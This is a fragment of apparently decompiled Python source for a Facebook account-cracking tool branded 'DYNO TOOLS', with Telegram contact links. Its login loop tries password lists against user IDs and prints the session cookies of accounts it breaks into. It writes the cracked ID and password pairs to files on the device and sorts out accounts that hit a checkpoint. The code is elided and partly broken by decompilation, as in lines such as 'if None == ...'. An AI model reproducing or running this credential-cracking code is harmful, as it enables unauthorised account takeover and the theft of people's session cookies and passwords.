...
def khld():
    ...
    if opt == '1':
        i()
    if None == '2':
        os.system('xdg-open https://t.me/I4M_DYNO')
        return None
    if None == '3':
        os.system('xdg-open https://t.me/ADMINxDYNO')
        return None
    if None == '4':
...
\x1b[1;91m>>    \x1b[1;94mWELCOME TO DYNO TOOLS   \x1b[1;91m <<
\x1b[1;91m>>     \x1b[1;96mTELEGRAM @i4m_DYNO Version (2)   \x1b[1;91m <<
\033[;90m===============================================================
\033[1;33m[-] \x1b[1;91mCODBY     :\033[1;35m DYNOx1778
\033[1;33m[-] \x1b[1;91mVERSION   :\033[1;35m UPDATE (2)
\033[1;33m[-] \x1b[1;91mCHANAL    :\033[1;35m TEAM_1778
\033[1;33m[-] \x1b[1;91mCHANAL    :\033[1;35m TEAM_1778
\033[1;33m[-] \x1b[1;91mUPDATE    :\033[1;35m Coming Soon
\033[1;33m[-] \x1b[1;91mCRACK     :\033[1;35m From KURDSTAN IRAQ
\033[1;90m===============================================================""")
loop = 0
oks = []
cps = []
    ...
    try:
        for ps in pwx:
            ...
            if 'c_user' in log_cookies:
                ...
                cid = coki[7:22]
                print('\r\r\033[1;32m[DYNO➡︎ØK🔥] ' +uid+ ' | ' +ps+    '  \n\033[1;35m[√]\033[1;32mCOOKIE = \033[1;34m'+coki+  ' \n\033[1;36m[√] [UAGENT] = \033[1;35m'+pro+'  \033[0;97m')
                cek_apk(session,coki)
                open('/sdcard/DYNO-OK.txt', 'a').write( cid+' | '+ps+'\n')
                oks.append(cid)
                break
            elif 'checkpoint' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[24:39]
                print('\r\r\33[1;30m[DYNO➡︎CL😢]  ' +uid+ ' | ' +ps+           '  \33[0;97m')
                open('/sdcard/zhiko-CP.txt', 'a').write( cid+' | '+ps+' \n')
                cps.append(cid)
                break
            else:
                continue
        loop+=1
        sys.stdout.write('\r\r%s[DYNO🔥] [%s/%s]  OK:- %s  CP:- %s '%(H,loop,tl,len(oks),len(cps))),
        sys.stdout.flush()
    except:
        pass
